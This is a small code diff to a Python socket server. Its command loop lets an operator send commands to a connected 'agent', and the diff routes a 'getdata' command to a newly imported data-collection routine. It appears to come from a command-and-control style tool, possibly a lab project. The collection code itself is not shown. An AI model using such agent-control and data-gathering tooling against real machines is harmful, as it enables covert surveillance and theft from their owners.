@@ -6,6 +6,7 @@ from sys import exit
 
 #Import of any in house modules
 from .socket_data_transfer import sendSocketData, receiveSocketData
+from ..data_collection.data import data_collection
 
 #Constants
 HOST = "127.0.0.1"
@@ -116,10 +117,13 @@ def startServer():
     while connectedSuccessfully:
       #Continuously gather user input
       cmd = input(f"[{agentDetails[0]} : {agentDetails[1]}]> ")
-
+      
       #Check input against functionality and run a particular process
       #if exit is input, command loop will break and user can reconnect
-      if cmd == "getdata" or cmd == "getmessage":
+
+      if cmd == "getdata":
+        data_collection(agentSocket)
+      elif cmd == "getmessage":
         sendSocketData(agentSocket, cmd)
         time.sleep(2)
         client_response = receiveSocketData(agentSocket)
